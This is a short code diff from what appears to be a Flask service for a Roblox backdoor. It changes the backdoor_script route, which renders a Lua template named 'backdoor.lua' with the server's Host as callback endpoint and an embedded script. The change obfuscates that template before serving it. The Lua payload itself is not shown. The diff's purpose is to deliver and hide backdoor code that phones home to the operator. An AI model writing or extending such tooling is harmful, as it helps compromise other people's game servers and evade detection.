@@ -4,8 +4,9 @@ import json
 import os
 
 import requests
-from flask import Blueprint, render_template, request
+from flask import Blueprint, render_template, request, send_file
 
+from prometheus.wrapper import obfuscate
 from utils.cookie import get_cookie
 from utils.inputs import PATH
 from utils.session import Session
@@ -104,7 +105,10 @@ def roblox_ping():
 def backdoor_script():
     with open(f"{PATH}/static/assets/lua/vlua.lua", encoding="utf8") as vlua_script:
         vlua_script = vlua_script.read()
-    return render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"), vlua=vlua_script)
+    rendered = render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"), vlua=vlua_script)
+    obfuscated = obfuscate(rendered)
+
+    return obfuscated
 
 @executor.route("/api/players", methods=["GET", "POST"])
 def roblox_player_ping():
